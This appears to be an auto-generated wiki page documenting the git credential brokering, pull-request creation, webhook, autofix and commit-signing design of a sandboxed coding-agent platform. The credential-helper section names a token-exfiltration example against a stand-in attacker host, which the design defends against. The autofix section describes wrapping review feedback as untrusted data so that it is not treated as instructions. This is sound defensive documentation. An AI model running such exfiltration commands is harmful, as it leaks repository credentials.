---
type: workflow
title: Git Auth and Pull Requests Workflow
description: SCM credential brokering to sandboxes, the provider-generated push-spec flow, per-branch pull request creation with force-push reuse, GitHub PR lifecycle webhooks, the GitHub autofix queue, and commit attribution/signing.
tags: [git, credentials, push, pull-requests, webhooks, autofix, commit-signing, attribution, github, gitlab]
verified:
  - by: openwiki/0.4.3
    at: 2026-08-29T06:58:43.189Z
sources:
  - id: openwiki-source-d6db273a7260c26ff3ad7e5c
    resource: repo://packages/control-plane/src/autofix/handler.ts
  - id: openwiki-source-e19487d3171a83931c8c0e95
    resource: repo://packages/control-plane/src/autofix/queue-consumer.ts
  - id: openwiki-source-96704df00a4363d571830513
    resource: repo://packages/control-plane/src/autofix/queue-health.ts
  - id: openwiki-source-863b4e7bfd78176d283f8e01
    resource: repo://packages/control-plane/src/autofix/service.ts
  - id: openwiki-source-78da2b6e3769fd428b85fe5a
    resource: repo://packages/control-plane/src/index.ts
  - id: openwiki-source-820b9ad986724854db571bee
    resource: repo://packages/control-plane/src/queue-routing.ts
  - id: openwiki-source-2f03a3c121b1d902de28dc9a
    resource: repo://packages/control-plane/src/routes/commit-signing.ts
  - id: openwiki-source-95edbc2c82f07c87d2b4f4b7
    resource: repo://packages/control-plane/src/routes/session-pull-requests.ts
  - id: openwiki-source-2ec333a28df9f76e36b65db7
    resource: repo://packages/control-plane/src/routes/session-runtime-proxy.ts
  - id: openwiki-source-f49c3ab49317a2ad215805d3
    resource: repo://packages/control-plane/src/routes/shared.ts
  - id: openwiki-source-b79e53115bc683bdc83c24f9
    resource: repo://packages/control-plane/src/session/contracts.ts
  - id: openwiki-source-2a0121defa6bca8c8c414ff1
    resource: repo://packages/control-plane/src/session/http/handlers/pull-request.handler.ts
  - id: openwiki-source-ec42ab309778945c4b848850
    resource: repo://packages/control-plane/src/session/http/handlers/sandbox.handler.ts
  - id: openwiki-source-c4154a235be14d15e37bb81f
    resource: repo://packages/control-plane/src/session/identity.ts
  - id: openwiki-source-1d490fe5af2ebc3cd9c8300b
    resource: repo://packages/control-plane/src/session/message-queue.ts
  - id: openwiki-source-19be9138d087c147d650a925
    resource: repo://packages/control-plane/src/session/participant-service.ts
  - id: openwiki-source-9d15c964265e29af445b4964
    resource: repo://packages/control-plane/src/session/pull-request-service.test.ts
  - id: openwiki-source-95708266900b62a9460b893c
    resource: repo://packages/control-plane/src/session/pull-request-service.ts
  - id: openwiki-source-0bc7329f2e3c2bf7579c15df
    resource: repo://packages/control-plane/src/session/pull-request-snapshot.ts
  - id: openwiki-source-1db0c3c43fc207113e2e8234
    resource: repo://packages/control-plane/src/session/repository-target.ts
  - id: openwiki-source-467e7dc8d2e7142d515a44b8
    resource: repo://packages/control-plane/src/session/sandbox-push-service.ts
  - id: openwiki-source-cc418ae85071e90eb8d81e29
    resource: repo://packages/control-plane/src/session/scm-credentials-service.ts
  - id: openwiki-source-c59860430ed84589a717b55a
    resource: repo://packages/control-plane/src/session/types.ts
  - id: openwiki-source-f42f326f8f3723fecdbd40b7
    resource: repo://packages/control-plane/src/source-control/branch-resolution.ts
  - id: openwiki-source-3f4f485b32cd4a751f5b34f7
    resource: repo://packages/control-plane/src/source-control/github-credential-authority.ts
  - id: openwiki-source-98be2b2c31c1e4ddbe0f097d
    resource: repo://packages/control-plane/src/source-control/providers/github-provider.ts
  - id: openwiki-source-49a4590261f3c9b1a968a52b
    resource: repo://packages/control-plane/src/source-control/providers/gitlab-provider.ts
  - id: openwiki-source-30bf9ff94b6bc0d008787863
    resource: repo://packages/control-plane/src/webhooks/github.ts
  - id: openwiki-source-2123ba68f61ce88fa71c15b5
    resource: repo://packages/control-plane/src/webhooks/pull-request-lifecycle.ts
  - id: openwiki-source-1918e0c43621ea5fb31a8558
    resource: repo://packages/github-bot/src/autofix-ingress.ts
  - id: openwiki-source-1eb6487041d89f0d461c45e0
    resource: repo://packages/github-bot/src/index.ts
  - id: openwiki-source-cbd064f0f85a511828117a62
    resource: repo://packages/sandbox-runtime/src/sandbox_runtime/bridge.py
  - id: openwiki-source-06d3b072476cfd51c8cb67f3
    resource: repo://packages/sandbox-runtime/src/sandbox_runtime/credentials/git_credential_helper.py
  - id: openwiki-source-1ea269c17eb60dceac81238c
    resource: repo://packages/sandbox-runtime/src/sandbox_runtime/git_signing.py
  - id: openwiki-source-f6f47e23b1ed14decd181a3b
    resource: repo://packages/sandbox-runtime/src/sandbox_runtime/plugins/inspect-plugin.js
  - id: openwiki-source-afdf6f72a667eba883658ee7
    resource: repo://packages/sandbox-runtime/src/sandbox_runtime/repo_config.py
  - id: openwiki-source-11c8139d3e5d8796cce14d68
    resource: repo://packages/shared/src/git.ts
  - id: openwiki-source-0eec14f0bb35cbc48198cb3c
    resource: repo://packages/shared/src/pull-request-tool.ts
  - id: openwiki-source-34ed6096e95a81ca049d14e4
    resource: repo://packages/web/src/components/sidebar/metadata-section.tsx
generated: { by: "opencode", at: "2026-08-29T06:58:43.189Z" }
---

# Git Auth and Pull Requests Workflow

Everything a sandbox needs to touch a remote — clone, fetch, push, open PRs, sign commits — flows
through a small set of brokered services. No long-lived SCM token is ever baked into a sandbox:
the sandbox asks the control plane for short-lived credentials on demand, the control plane
generates provider-specific push specs, and the pull request lifecycle is reconciled from GitHub
webhooks against a D1 authority record. The moving parts:

- **Sandbox credential helper** — `packages/sandbox-runtime/src/sandbox_runtime/credentials/git_credential_helper.py`
- **Control-plane credential minting** — `packages/control-plane/src/session/scm-credentials-service.ts`
  and `generateCredentialHelperAuth()` on the providers in `packages/control-plane/src/source-control/providers/`
- **Push + PR orchestration** — `packages/control-plane/src/session/pull-request-service.ts`,
  `packages/control-plane/src/session/http/handlers/pull-request.handler.ts`, and the sandbox-side
  `create-pull-request` tool in `packages/sandbox-runtime/src/sandbox_runtime/plugins/inspect-plugin.js`
  plus the bridge push executor in `packages/sandbox-runtime/src/sandbox_runtime/bridge.py`
- **PR lifecycle webhooks** — `packages/control-plane/src/webhooks/pull-request-lifecycle.ts`,
  fed from the internal normalized-event route `packages/control-plane/src/webhooks/github.ts`
- **Autofix queue** — `packages/github-bot/src/autofix-ingress.ts` (ingress) and
  `packages/control-plane/src/autofix/` (service, queue consumer, queue health)
- **Commit attribution and signing** — `packages/control-plane/src/session/identity.ts` +
  `message-queue.ts` (author identity) and `packages/sandbox-runtime/src/sandbox_runtime/git_signing.py`
  (committer identity, SSH signing config)

Related pages: [Security and Tokens](../concepts/security-and-tokens.md),
[Sessions](../concepts/sessions.md),
[Source Control Providers](../integrations/source-control-providers.md), and
[Prompt Flow](prompt-flow.md) (where the author identity originates).

## Credential brokering: the sandbox git credential helper

Every git operation inside the sandbox invokes `git_credential_helper.py`, a credential helper that
speaks git's `credential` protocol (see gitcredentials(7)). It implements the `get` action only —
`store` and `erase` are no-ops because the control plane owns credential truth. On each `get` it:

1. **Resolves the control-plane context** from the environment: `CONTROL_PLANE_URL`,
   `SANDBOX_AUTH_TOKEN`, and the session id embedded in `SESSION_CONFIG`. All three must be present.
2. **Scopes the request** before minting anything: the credential protocol input must carry
   `protocol=https` and `host` equal to the configured `VCS_HOST` (default `github.com`). This
   prevents a malicious submodule URL or `git ls-remote https://attacker.example/…` from exfiltrating
   the installation token. Scoping is deliberately *not* narrowed to the session repo: installation-wide
   credentials are the existing model, and setup hooks may clone sibling private repositories. An
   unauthorized request returns exit 0 with no output, so git falls through to other helpers or fails
   auth cleanly — the token is never emitted to the wrong host.
3. **Serves from cache or mints fresh.** Successful responses are persisted to
   `/run/oi/scm-creds.json` (mode 0600, atomic tmp-file replace) and reused until within
   `CACHE_REFRESH_BUFFER_SECONDS` (5 minutes) of expiry. Concurrent first-boot invocations are
   serialized with an advisory `flock` on a sibling lock file, re-checking the cache after acquiring
   the lock. The cache is never a fallback for a failed refresh — a control-plane rejection exits
   non-zero rather than silently serving stale tokens.
4. **Calls `POST /sessions/{sessionId}/scm-credentials`** with the sandbox bearer token and reads
   `{username, password, expires_at_epoch_ms}` from the JSON response. An invalid or missing
   `expires_at_epoch_ms` fails loud — caching it would cause a refetch on every git op.

### The control-plane endpoint

`POST /sessions/:id/scm-credentials` is registered in `packages/control-plane/src/routes/session-runtime-proxy.ts`
as a `simpleProxyRoute` and proxied to the session DO's internal path `/internal/scm-credentials`
(`SessionInternalPaths.scmCredentials`). Its route policy (`SCM_CREDENTIALS_ROUTE` in
`packages/control-plane/src/routes/shared.ts`) requires **sandbox authentication** bound to the
session id. Inside the DO, `SandboxHandler.scmCredentials` (`packages/control-plane/src/session/http/handlers/sandbox.handler.ts`)
requires a repository context, delegates to `ScmCredentialsService`, and returns the credential with
`Cache-Control: no-store`. The password is never logged.

`ScmCredentialsService` is a thin adapter in front of `SourceControlProvider.generateCredentialHelperAuth()`:

- **GitHub** (`github-provider.ts`) mints a cached GitHub App installation token (`getCachedInstallationTokenWithExpiry`)
  and returns `x-access-token` as the username. A missing GitHub App config is a permanent
  `SourceControlProviderError`.
- **GitLab** (`gitlab-provider.ts`) returns the `oauth2` username with the stored access token and a
  `GITLAB_CREDENTIAL_HELPER_TTL_MS` expiry.

Provider errors map to HTTP status by error type: `permanent` → 500 (config error, retrying won't
help), transient → 502 (upstream blip; the helper exits 1 and the next git operation retries).

### Env-token fallback (legacy snapshot restores and image builds)

Only when **no control-plane context exists at all** does the helper fall back to the static
`VCS_CLONE_TOKEN` env var (`VCS_CLONE_USERNAME` or `x-access-token`), treating it as good for one
hour (`BUILD_MODE_TOKEN_TTL_SECONDS = 3600`). This is how image-build sandboxes — which have no
control plane to refresh against — authenticate their one-shot clone. If the control-plane
environment is present but incomplete, the helper *refuses* the env fallback and raises, so a broken
session sandbox can never silently downgrade to a static token.

### gh CLI token support

The helper also implements a `gh-token` action consumed by the `gh-wrapper.sh` wrapper. It mints a
fresh token only when the environment has nothing usable: `GH_TOKEN` (user-owned) always wins, and
`OI_GITHUB_TOKEN_IS_FALLBACK=1` marks the system's own expiring installation fallback and triggers a
refresh. On non-github deployments it never touches gh's auth, and a failed mint prints nothing
(exit 0) so the wrapper falls through to the existing environment.

## Credential authority for user-facing flows

Where a *user's* GitHub credentials are needed (as opposed to installation credentials),
`resolveGitHubCredentialAuthority` (`packages/control-plane/src/source-control/github-credential-authority.ts`)
selects the credential store for the verified principal:

- A **user principal** must carry browser-session provenance (`authentication` + `getUserAuth`);
  the linked GitHub provider accounts are enumerated and validated against the principal's user id —
  more than one GitHub account is a corruption error. The authority is `browser_session` with the
  linked account's subject (or `null` when none is linked).
- **Service actors** retain the `legacy` token store, and a non-user principal carrying
  browser-session provenance is rejected.

A browser user never silently falls back to the legacy token store when provenance is missing.

## The push-spec flow

The agent creates PRs through the sandbox-shipped `create-pull-request` OpenCode tool
(`inspect-plugin.js`), which is the only sanctioned path — the tool description explicitly forbids
`gh` CLI usage. The flow:

1. **Tool request.** The tool resolves the current HEAD branch, resolves the optional `repo`
   argument (required for multi-repo sessions) against the supervisor-written repo manifest, and
   `POST`s `{title, body, baseBranch, headBranch, repoOwner, repoName, draft}` to
   `/sessions/{id}/pr` with sandbox auth.
   The `owner/name` argument is parsed by splitting on the **last** `/` (`inspect-plugin.js`
   `resolveRepositoryTarget`): owners may be nested namespaces (GitLab subgroups), only `repo_name`
   is a single path segment, and empty owner segments are rejected. The manifest's canonical casing
   and path are used — never the tool-supplied strings.
2. **HTTP boundary.** `PullRequestHandler.createPr` (`packages/control-plane/src/session/http/handlers/pull-request.handler.ts`)
   re-validates membership with `resolveSessionRepositoryTarget`: naming a repo outside the session
   is 403, an ambiguous or half-specified target is 400. This matters because the route is reachable
   with sandbox auth, so membership is a security boundary. It then resolves the prompting
   participant and its PR auth.
3. **User OAuth resolution.** `ParticipantService.resolveAuthForPR` returns the prompting user's
   decrypted OAuth token when available. When the user has no SCM token (e.g. sessions triggered
   from Linear or other integrations without user GitHub OAuth), the token is expired and refresh
   fails, or decryption fails, it returns `auth: null` and the service falls back to the App
   installation token (`input.promptingAuth ?? appAuth`). The provider-level `buildManualPullRequestUrl`
   builders (GitHub `/pull/new/<base>...<head>`, GitLab `merge_requests/new` with source/target
   query params) remain the pull/new fallback surface: the sandbox tool recognizes a
   `{status: "manual", createPrUrl}` response and returns a `manual` envelope
   (`packages/shared/src/pull-request-tool.ts`), and legacy `manual_pr` branch artifacts carrying
   `createPrUrl` metadata are still rendered by the web UI — but the DO's current create path always
   opens the PR with the resolved auth and ignores prior manual artifacts when creating.
4. **Service orchestration.** `SessionPullRequestService.createPullRequest`
   (`packages/control-plane/src/session/pull-request-service.ts`) re-resolves the repository target
   itself (defense in depth — it does not trust its caller), takes a per-repository in-flight claim
   (409 if a PR for that repo is already being created in this session), resolves SCM settings
   (draft-mode policy and PR label; resolution failure → 503), and generates fresh push auth via
   `provider.generatePushAuth()`.

### Base and head branch resolution

- **Base**: explicitly requested → the target member entry's base branch (row, or the scalar
  mirror for legacy sessions) → the repository's default branch from the provider.
- **Head**: `resolveHeadBranchForPr` (`packages/control-plane/src/source-control/branch-resolution.ts`)
  applies deterministic precedence — requested branch → the target's stored working branch → the
  generated `open-inspect/<session-id>` branch (`generateBranchName` in `packages/shared/src/git.ts`) —
  with `sanitizeBranchName` rejecting `HEAD`, leading/trailing `/` or `.`, whitespace, `..`, `@{`,
  and refspecial characters, and a candidate equal to the base branch skipped. The source
  (`request`/`session`/`generated`) is carried along because reuse safety (below) depends on it.

### Force-push and per-branch PR reuse

The provider's `buildGitPushSpec` produces `{remoteUrl, redactedRemoteUrl, refspec, targetBranch,
repoOwner, repoName, force}` — `HEAD` force-pushed onto the sanitized head branch over a
token-embedded HTTPS remote URL plus a redacted twin for logging. `SandboxPushService.pushBranchToRemote`
(`packages/control-plane/src/session/sandbox-push-service.ts`) delivers the `push` command over the
sandbox WebSocket and awaits the sandbox's completion, keyed by `(repoOwner, repoName, targetBranch)`;
with no sandbox connected it assumes the branch was pushed manually and returns success.

Because PR creation spans several awaits during which the DO serves other requests, a persisted-
artifact scan alone cannot enforce one PR per repo. Two mechanisms cooperate:

- **In-flight claims** — `PullRequestCreationClaims`, an in-memory per-DO-instance set keyed by
  lowercase `owner/name`; a concurrent create for the same repo answers 409.
- **The existing-open-PR walk** — `resolveExistingOpenPullRequest` scans persisted `pr` artifacts
  matching the resolved head branch and, for every stored-open (or state-less legacy) candidate,
  reads the provider's *live* state rather than trusting artifact recency. A merged/closed live PR
  releases its head: the stale-open artifact is healed via the canonical snapshot application and
  the walk continues. A genuinely open PR is **reused** only when the head is the checkout — an
  explicitly requested branch or the generated session branch (whose content is by construction
  whatever HEAD force-pushes onto it). An open PR holding a stored custom branch reached via
  fallback is answered 409: force-pushing over it would destroy a PR this request never saw. An
  explicitly different base asks for a separate PR from the same head, so the walk continues;
  without an explicit base the candidate's base stands (a stacked PR's base is not the session
  default). Unverifiable legacy candidates without a PR number or URL keep the head claimed (409).

When an open PR is reused, the branch is still force-pushed and the response reports
`updated: true` with the existing PR number/URL — calling the tool again from the same branch
updates that branch's open PR. Otherwise the provider's `createPullRequest` runs with the resolved
<!-- openwiki: broken internal link [session-url] file "session-url" does not exist. Fix the href or restore the target, then delete this comment. -->
auth, the PR body gets the `*Created with [app](session-url)*` footer, and the result is written as
a DO `pr` artifact (metadata derived from the one snapshot mapping in
`packages/control-plane/src/session/pull-request-snapshot.ts`) plus a best-effort D1 authority
record (`SessionPullRequestStore.upsert`; a failed write is logged and swallowed — the first webhook
or read-through repairs it). Both `artifact_created` and `session_branch` (after the member row and
scalar branch updates) are broadcast to connected clients.

### Sandbox-side push execution

The bridge's `_handle_push` (`packages/sandbox-runtime/src/sandbox_runtime/bridge.py`) turns the
`pushSpec` into a `PushRequest` (fields normalized to `""`/`False`, never errors at parse time) and
runs the pipeline parse → validate → resolve checkout → `git push`:

- **Validation** rejects a missing push spec, partial repo identity (owner without name or vice
  versa), a missing target branch, and a missing refspec or push URL — each with a user-facing
  message.
- **Checkout resolution** is manifest-driven: with repo identity, the matching manifest entry's
  path is used verbatim (spec-supplied strings never become filesystem paths, so a crafted name
  cannot select a checkout outside the session); without identity (legacy single-repo sessions),
  the one clone directly under `/workspace`.
- **Execution** runs `git push <push_url> <refspec> [-f]` with a 300-second
  `GIT_PUSH_TIMEOUT_SECONDS`; a hung push is terminated and killed after a 5-second grace. Failing
  stderr is redacted (token-bearing URL swapped for the redacted twin) before logging or echoing.
  Every failure funnels into the single `push_error` event (carrying `branchName` and repo fields
  so the control plane resolves its pending push); success emits `push_complete`.

## GitHub PR lifecycle webhooks

The github-bot forwards pre-normalized `GitHubAutomationEvent`s to the control plane's internal
`POST /internal/github-event` route (`packages/control-plane/src/webhooks/github.ts`, poster
identity enforced). Automation matching is forwarded to the scheduler; PR lifecycle tracking
piggybacks on the same forward via `processPullRequestLifecycleEvent`
(`packages/control-plane/src/webhooks/pull-request-lifecycle.ts`), runs in `waitUntil`, and is
additive — a lifecycle failure never affects automation matching.

Correlation is **identity-first**: the record is looked up by
`(repository_external_id, repoOwner, repoName, pr_number)`. On a hit, a guarded update builds a
`PullRequestSnapshot` from the webhook facts (state+`merged` disambiguate merged from closed; draft
only while open) and runs the single **authority-then-mirror** sequence: upsert the D1 record, and
only if the store's monotonic guard *accepted* the write push the snapshot into the owning session
DO's artifact mirror. A rejected write is `stale` and must never reach the mirror; a *thrown* upsert
still pushes to the mirror (which applies its own guard) and reports `record_write_failed` —
redelivery or read-through repairs D1. The webhook also refreshes stored owner/name after a
repository rename/transfer.

On a miss (e.g. the best-effort creation write failed), the **branch fallback** derives the session
id from the branch convention via `extractSessionIdFromBranch` (`open-inspect/<session>`), then
applies guarded checks: the session must exist and already be associated with the event's
repository, cross-repository (fork) heads are dropped as not-ours, the session must hold a matching
DO `pr` artifact (preferring the artifact carrying the webhook's PR number; number-less legacy
metadata only when no numbered artifact matches), and the payload must carry enough facts. Each
guard failure has its own outcome (`no_branch_session`, `session_not_associated`,
`cross_repository`, `no_matching_artifact`, `insufficient_payload`).

Manual sync is available at `POST /sessions/:id/pull-requests/refresh`
(`packages/control-plane/src/routes/session-pull-requests.ts`): it forwards to the DO's internal
refresh route, kicks a background read-through, and answers 202 immediately — deliberately no
session-index touch, since PR changes must never reorder the session list.

## The GitHub autofix queue

Autofix turns PR review feedback into a follow-up prompt to the session that owns the PR. The path
is split across two workers:

**Ingress (github-bot).** `toAutofixEnvelope` (`packages/github-bot/src/autofix-ingress.ts`)
normalizes two webhook shapes — `issue_comment` created on a PR (explicit bot mentions excluded,
they belong to the mention flow) and `pull_request_review` submitted — into a
`GitHubAutofixEnvelope` and sends it to the `AUTOFIX_QUEUE` binding; an enqueue failure is logged
and does not block the main webhook handling.

**Consumption (control plane).** The worker's `queue()` handler (`packages/control-plane/src/index.ts`)
routes by queue name — `isAutofixQueue` (`packages/control-plane/src/queue-routing.ts`) matches the
`open-inspect-github-autofix-` prefix → `handleAutofixQueue` (`packages/control-plane/src/autofix/handler.ts`);
everything else falls through to image-build finalization. `AutofixQueueConsumer.consume`
(`queue-consumer.ts`) parses the envelope (invalid → `retry()`), then:

- `AutofixService.process` dedupes via a `FeedbackStore` receipt (`received`/`queued`/`skipped`/
  `failed`), skips untracked PRs (no D1 authority record), and recovers prior ambiguous dispatches
  by looking up whether the feedback message actually reached the session (`lookup_feedback`).
- **Eligibility** (`resolveEligibleFeedback` + `ineligibilityReason`): per-repo settings must enable
  autofix for the repo, and the matching toggles (`prCommentsEnabled` / `reviewsEnabled`) must be
  on; the PR must be open; the author must be eligible — the bot's own PR comments are skipped (its
  own reviews only when `openInspectReviewsEnabled`), explicit `@bot` mentions are skipped (mention
  flow), human authors need write permission on the PR, other bots must be in `allowedReviewBots`,
  and feedback must be non-empty with an actionable review state (`COMMENTED` / `CHANGES_REQUESTED`).
- **Prompt construction** (`buildPrompt`): review content is capped at
  `MAX_GITHUB_AUTOFIX_REVIEW_COMMENTS` comments, diff hunks at 4,000 chars each, and the whole
  serialized prompt at 200,000 bytes; HTML brackets are escaped and the payload is wrapped in a
  `<github_feedback_data>` block the prompt explicitly declares untrusted — review data, not
  instructions.
- **Dispatch**: an `enqueue_feedback` command is POSTed to the session DO's internal autofix path
  (`SessionInternalPaths.autofix` = `/internal/autofix`); the DO answers `enqueued`/`duplicate`
  (receipt marked queued with the message id) or `rejected` (receipt marked skipped with the
  reason). A failed dispatch attempts recovery before rethrowing.

**Failure policy**: a `permanent` `SourceControlProviderError` marks the feedback failed and acks;
otherwise the error is recorded, and after `MAX_DELIVERY_ATTEMPTS` (5) deliveries the feedback is
marked failed (`delivery_attempts_exhausted`) — unless a concurrent writer won the terminal
transition, in which case the message acks — and retried.

**Queue health**: the worker's every-minute cron calls `checkAutofixQueueHealth`
(`queue-health.ts`), which inspects the primary queue and the dead-letter queue and logs an
`autofix.queue_health` error when the primary backlog exceeds 25 messages or its oldest message is
older than 5 minutes, or when the DLQ holds any messages.

## Commit attribution and signing

Commits are attributed to the prompting user as author and the bot as committer, with optional
SSH signing.

**Author identity (control plane).** When the message queue dispatches a prompt
(`resolveParticipantGitIdentity` in `packages/control-plane/src/session/message-queue.ts`), it calls
`resolveGitAuthorIdentity` (`packages/control-plane/src/session/identity.ts`): for GitHub, a valid
numeric SCM user id + login yields the author name (display name or login) and the ID-based
`{id}+{login}@users.noreply.github.com` noreply email; a missing/invalid id yields `null`. For
non-GitHub providers the stored name/email are used with an OpenInspect fallback. The result rides
on the prompt command as `author.gitIdentity` — either `{mode: "attributed-user", name, email}` or
`{mode: "agent-only"}` — with no inference on the sandbox side.

**Committer identity and signing (sandbox).** `parse_prompt_git_author` (`bridge.py`) validates the
control plane's explicit mode (`agent-only` → no author override; anything else invalid → error).
`GitSigningRuntime` (`packages/sandbox-runtime/src/sandbox_runtime/git_signing.py`) then fetches the
commit-signing configuration from `GET /sessions/{id}/commit-signing` (sandbox bearer auth) — either
`{enabled: false}` or `{enabled: true, committerName, committerEmail, publicKey}` where the public
key must be an `ssh-ed25519` key — and applies per-repository local git config across every
manifest repository:

- **Signing enabled**: `committer.name`/`committer.email` = the bot identity, `gpg.format=ssh`,
  `gpg.ssh.program` = the `oi-git-sign` signer binary (`GIT_SIGNER_COMMAND`), `user.signingkey` =
  `key::<publicKey>`, `commit.gpgsign=true`. The author (`author.*` and `user.*`) is the prompting
  user when attributed, else the committer identity.
- **Signing disabled**: all signing config is unset (`--unset-all` across
  `SIGNING_CONFIG_KEYS`) and the author is the prompting user or the unsigned OpenInspect fallback
  (`open-inspect@noreply.github.com`).

The runtime refreshes on every prompt (`_configure_git_identity` in the bridge), so attribution
follows the active prompt author. All configuration errors are bounded `GitSigningError`s that
never include secret configuration values, and the signing private key itself lives only on the
control plane side (the `oi-git-sign` broker client signs payloads via the signing route, capped at
1 MiB payloads).

## Owner namespaces: splitting on the last slash

Repo owners are not always single-segment: GitHub owners are (`octocat`), but GitLab subgroups nest
(`group/subgroup`). The codebase treats this consistently:

- `repo_name` is the only single path segment (the checkout directory under `/workspace`);
  `is_safe_repo_owner` (`packages/sandbox-runtime/src/sandbox_runtime/repo_config.py`) accepts a
  namespace *path* of safe segments and rejects only empty segments and traversal (`a//b`, `/etc`,
  `..`); `parse_repositories` accepts `/`-joined owners.
- Where a full `owner/name` string must be split, it is split on the **last** `/` with empty-segment
  rejection (e.g. the create-PR tool's `resolveRepositoryTarget` shown above). Manual PR URLs encode
  the owner path (GitLab's `encodeProjectWebPath`), and owner casing is preserved from canonical
  sources (manifest / member rows) while comparisons normalize case.
